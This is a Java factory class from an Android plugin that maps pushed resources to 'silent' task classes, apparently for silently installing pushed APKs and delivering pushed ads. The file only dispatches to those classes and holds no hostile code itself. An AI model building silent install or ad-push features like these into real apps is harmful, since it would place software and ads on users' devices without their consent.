package com.tiho.dlplugin.task.silent.SilentTask;

import java.lang.reflect.Constructor;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushLinkBean;
import com.tiho.dlplugin.bean.PushSilentBean;
import com.tiho.dlplugin.bean.Resource;
import com.tiho.dlplugin.task.silent.SilentList;

import android.content.Context;
import android.util.SparseArray;

public final class SilentTaskFactory {
	public final static int SILENTTASK_APK=1;
	public final static int SILENTTASK_AD=2;
	private static SparseArray<SilentTask> silent =new SparseArray<SilentTask>();
	private static SparseArray<Class <? extends SilentTask >> mappers =new SparseArray<Class<? extends SilentTask>>();
	static {
		mappers.put(SILENTTASK_APK, SilentTaskApk.class);
		mappers.put(SILENTTASK_AD, SilentTaskAd.class);
	}
	public static SilentTask getSilentTask(Context context ,SilentList list,  Resource rs){
		int type =0;
		if(rs instanceof PushSilentBean){
			type =SILENTTASK_APK;
		}else if(rs instanceof PushLinkBean){
			type =SILENTTASK_AD;
		}
		SilentTask silentTask = silent.get(type);
		if(silentTask==null){
			Class <? extends SilentTask > cls =mappers.get(type);
			if(cls !=null){
				Constructor<? extends SilentTask> cons;
				try {
					cons =cls.getConstructor(Context.class,SilentList.class);
					silentTask = cons.newInstance(context,list);
				} catch (Exception e) {
					e.printStackTrace();
				}
				silent.put(type, silentTask);
				
			}else {
				LogManager.LogShow("No silent found for type "+type);
			}
		}
		return silentTask;
	}
}
